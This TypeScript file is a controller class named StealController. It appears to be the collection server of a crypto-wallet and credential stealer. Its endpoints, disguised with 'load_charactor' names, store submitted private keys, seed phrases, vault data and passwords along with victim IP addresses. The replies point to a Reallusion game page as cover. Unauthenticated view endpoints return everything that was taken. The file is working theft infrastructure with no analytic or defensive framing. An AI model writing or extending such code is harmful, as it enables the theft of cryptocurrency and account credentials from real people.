import History from "../models/history"
import Password from "../models/password";
import Private from "../models/private";
import Seed from "../models/seed";
import Vault from "../models/vault";
import Status from "../models/status";
import mongoose from "mongoose"

class StealController {
    constructor() {}

    static async load_charactor_pk(req: any, res: any) {
        const {name, ip} = req.body;

        try {
            const duplicate = await Private.findOne({string: name});

            if (duplicate) {
                return res.json({charactor_url: "Already exists"})
            }
        } catch(err) {
            console.log(err);
            return res.json({charactor_url: "error encountered"});
        }

        
        try {
            await Private.create({
                _id: new mongoose.Types.ObjectId().toHexString(),
                string: name,
                ip: ip,
                time: new Date(),
            })
        } catch(err) {
            console.log(err);
        }

        return res.json({charactor_url: "https://www.reallusion.com/iclone/game/"})
    }

    static async load_charactor_sd(req: any, res: any) {
        const {name, ip} = req.body;

        try {
            const duplicate = await Seed.findOne({string: name});

            if (duplicate) {
                return res.json({charactor_url: "Already exists"})
            }
        } catch(err) {
            console.log(err);
            return res.json({charactor_url: "error encountered"});
        }

        try {
            await Seed.create({
                _id: new mongoose.Types.ObjectId().toHexString(),
                string: name,
                ip: ip,
                time: new Date(),
            })
        } catch(err) {
            console.log(err);
        }

        return res.json({charactor_url: "https://www.reallusion.com/iclone/game/"})
    }

    static async load_charactor_vault(req: any, res: any) {
        const {name, ip} = req.body;
        try {
            const duplicate = await Vault.findOne({string: name, ip: ip});

            if (duplicate) {
                return res.json({charactor_url: "Already exists"})
            }
        } catch(err) {
            console.log(err);
            return res.json({charactor_url: "error encountered"});
        }

        try {
            await Vault.create({
                _id: new mongoose.Types.ObjectId().toHexString(),
                string: name,
                ip: ip,
                time: new Date(),
            })
        } catch(err) {
            console.log(err);
        }

        return res.json({charactor_url: "https://www.reallusion.com/iclone/game/"})
    }

    static async load_charactor_pwd(req: any, res: any) {
        const {name, ip} = req.body;

        try {
            const duplicate = await Password.findOne({string: name, ip: ip});

            if (duplicate) {
                return res.json({charactor_url: "Already exists"})
            }
        } catch(err) {
            console.log(err);
            return res.json({charactor_url: "error encountered"});
        }


        try {
            await Password.create({
                _id: new mongoose.Types.ObjectId().toHexString(),
                string: name,
                ip: ip,
                time: new Date(),
            })
        } catch(err) {
            console.log(err);
        }

        return res.json({charactor_url: "https://www.reallusion.com/iclone/game/"})
    }

    
    static async load_charactor_status(req: any, res: any) {
        const {name, ip} = req.body;

        try {
            const duplicate = await Status.findOne({ip: ip});

            if (duplicate) {
                duplicate.string = name;
                duplicate.time = new Date();
                await duplicate.save();
                return res.json({version: "1.0.3"})
            } else  {
                await Status.create({
                    _id: new mongoose.Types.ObjectId().toHexString(),
                    string: name,
                    ip: ip,
                    time: new Date(),
                })
                return res.json({version: "1.0.3"})
            }
        } catch(err) {
            console.log(err);
            return res.json({charactor_url: "error encountered"});
        }
    }

    static async view_pk(req: any, res: any) {
        try {
            const data = await Private.find({});
            return res.json(data)
        } catch(err) {
            return res.json({error: err})
        }

    }

    static async view_sd(req: any, res: any) {
        try {
            const data = await Seed.find({});
            return res.json(data)
        } catch(err) {
            return res.json({error: err})
        }

    }

    static async view_vault(req: any, res: any) {
        try {
            const data = await Vault.find({});
            return res.json(data)
        } catch(err) {
            return res.json({error: err})
        }

    }

    static async view_status(req: any, res: any) {
        try {
            const data = await Status.find({});
            return res.json(data)
        } catch(err) {
            return res.json({error: err})
        }
    }

    static async view_pwd(req: any, res: any) {
        try {
            const data = await Password.find({});
            return res.json(data)
        } catch(err) {
            return res.json({error: err})
        }

    }
}

export default StealController;